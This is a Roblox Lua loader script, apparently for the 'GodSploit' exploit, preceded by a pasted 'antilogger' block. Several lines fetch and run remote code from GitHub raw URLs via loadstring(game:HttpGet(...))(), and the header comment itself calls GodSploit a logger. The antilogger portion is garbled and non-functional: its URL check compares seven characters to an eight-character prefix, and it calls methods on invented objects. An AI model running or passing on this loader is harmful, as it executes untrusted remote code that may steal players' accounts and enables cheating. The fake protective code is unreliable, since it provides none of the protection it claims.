--just for some godsploit antirats test
-- use it at your risk cuz godsploit is a logger.
repeat task.wait() until game:IsLoaded()
--LEGEND ANTILOGGER
-- No Https Requestor
local ReplicatedStorage = game:GetService("ReplicatedStorage")

function blockHTTPRequests(request)
  if request and request.URL and request.URL:lower():sub(1, 7) == "https://" then
    print("Blocked https request: ", request.URL)
    return false
  end
  return true
end

ReplicatedStorage.leakyAssets.leakyScript:SetNetworkOwner(nil)
ReplicatedStorage.HttpService.RequestPerformance.OnClientEvent = blockHTTPRequests
loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemXVoid/Render/source/scripts/antilogger.lua",true))()

print("all antilogger is ready!")
-- RENDER ON TOP

local MainScriptLoadstring = "https://raw.githubusercontent.com/AlSploit/GodSploit/main/MainScript"
local SecurityLoadstring = "https://raw.githubusercontent.com/AlSploit/GodSploit/main/Security"

local Data = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/GodSploit/main/Execute", true))()

local function InitMainScript()
	task.spawn(function()
		loadstring(game:HttpGet(MainScriptLoadstring))()
	end)	
end

local function InitSecurity()
	task.spawn(function()
		loadstring(game:HttpGet(SecurityLoadstring))()
	end)
end

task.spawn(function()
	task.spawn(function()
		InitSecurity()
	end)

	task.wait()

	task.spawn(function()
		InitMainScript()
	end)
end)
